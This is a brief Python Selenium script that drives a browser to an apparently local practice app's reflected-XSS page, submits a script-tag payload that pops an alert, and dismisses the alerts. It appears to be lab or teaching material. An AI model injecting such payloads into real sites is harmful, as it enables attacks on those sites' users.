from selenium import webdriver
import util.alerthandling as ah
from util.driversetup import DRIVER

global DRIVER

#driver = ds.setupDriver()
DRIVER.get("http://127.0.0.1/vulnerabilities/xss_r/")

injection_message = "/html/body/div/div[3]/div/div/form/p/input[1]"
injection_submit = "/html/body/div/div[3]/div/div/form/p/input[2]"
DRIVER.find_element_by_xpath(injection_message).send_keys("Evilyn <script>alert('We hacked you!')</script>")

DRIVER.find_element_by_xpath(injection_submit).click()
ah.clearAllAlerts(DRIVER)
